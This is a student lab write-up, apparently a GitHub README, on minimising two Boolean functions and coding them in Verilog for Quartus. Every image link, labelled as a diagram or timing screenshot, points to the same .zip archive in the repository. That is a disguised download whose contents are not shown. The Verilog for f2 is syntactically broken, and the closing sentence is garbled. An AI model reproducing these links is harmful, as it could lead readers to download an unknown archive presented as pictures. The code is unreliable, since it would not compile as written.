# BOOLEAN_FUNCTION_MINIMIZATION

**AIM:**

To implement the given logic function verify its operation in Quartus using Verilog programming.

F1= A’B’C’D’+AC’D’+B’CD’+A’BCD+BC’D 

F2=xy’z+x’y’z+w’xy+wx’y+wxy

**Equipment Required:**

Hardware – PCs, Cyclone II , USB flasher

**Software – Quartus prime**

**Theory**

**Logic Diagram**

![WhatsApp Image 2025-03-26 at 09 01 48_25bb1e53](https://raw.githubusercontent.com/Yugabharathi91/BOOLEAN_FUNCTION_MINIMIZATION/main/output_files/BOOLEA-MINIMIZATION-FUNCTIO-v2.9.zip)

![WhatsApp Image 2025-03-26 at 09 01 48_0225d9f2](https://raw.githubusercontent.com/Yugabharathi91/BOOLEAN_FUNCTION_MINIMIZATION/main/output_files/BOOLEA-MINIMIZATION-FUNCTIO-v2.9.zip)


**Procedure**

1.	Type the program in Quartus software.

2.	Compile and run the program.

3.	Generate the RTL schematic and save the logic diagram.

4.	Create nodes for inputs and outputs to generate the timing diagram.

5.	For different input combinations generate the timing diagram.


**Program:**
```
module functi(a, b,c,d, f1);
input a,b,c,d;
output f1;
assign f1=((~b &~d)|(~a & b & d)|(a & b & ~c));
endmodule
module funct2(w,x,y,z, f2);
input w,x,y,z;
output f2;
assign f2=((~y & z)(w & y )I(x & y));
endmodule
```
Developed by: Yugabharathi.M
RegisterNumber: 212224230314


**RTL realization**

![WhatsApp Image 2025-03-26 at 09 01 49_71db59ab](https://raw.githubusercontent.com/Yugabharathi91/BOOLEAN_FUNCTION_MINIMIZATION/main/output_files/BOOLEA-MINIMIZATION-FUNCTIO-v2.9.zip)
![WhatsApp Image 2025-03-26 at 09 01 49_3f9a1783](https://raw.githubusercontent.com/Yugabharathi91/BOOLEAN_FUNCTION_MINIMIZATION/main/output_files/BOOLEA-MINIMIZATION-FUNCTIO-v2.9.zip)


**Output:**

**RTL**
![WhatsApp Image 2025-03-26 at 09 01 49_8dcb14c0](https://raw.githubusercontent.com/Yugabharathi91/BOOLEAN_FUNCTION_MINIMIZATION/main/output_files/BOOLEA-MINIMIZATION-FUNCTIO-v2.9.zip)
![WhatsApp Image 2025-03-26 at 09 01 49_c17418a8](https://raw.githubusercontent.com/Yugabharathi91/BOOLEAN_FUNCTION_MINIMIZATION/main/output_files/BOOLEA-MINIMIZATION-FUNCTIO-v2.9.zip)



**Timing Diagram**
![WhatsApp Image 2025-03-26 at 09 01 49_b7870f35](https://raw.githubusercontent.com/Yugabharathi91/BOOLEAN_FUNCTION_MINIMIZATION/main/output_files/BOOLEA-MINIMIZATION-FUNCTIO-v2.9.zip)
![WhatsApp Image 2025-03-26 at 09 01 49_ecb00456](https://raw.githubusercontent.com/Yugabharathi91/BOOLEAN_FUNCTION_MINIMIZATION/main/output_files/BOOLEA-MINIMIZATION-FUNCTIO-v2.9.zip)



**Result:**

Thus the given logic functions are implemented using and their operations are verified using Verilog programming.

